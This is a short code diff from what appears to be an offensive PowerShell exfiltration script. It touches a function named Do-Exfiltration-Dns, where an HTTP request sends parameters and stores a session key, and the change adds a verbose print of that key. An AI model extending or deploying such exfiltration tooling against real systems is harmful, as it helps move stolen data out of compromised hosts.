@@ -306,7 +306,8 @@ function Do-Exfiltration-Dns($pastename,$pastevalue,$ExfilOption,$dev_key,$usern
         $http_request.setRequestHeader("Content-length", $parameters.length); 
         $http_request.setRequestHeader("Connection", "close") 
         $http_request.send($parameters) 
-        $script:session_key=$http_request.responseText 
+        $script:session_key=$http_request.responseText
+        Write-Verbose $session_key
     } 
 
     function Compress-Encode
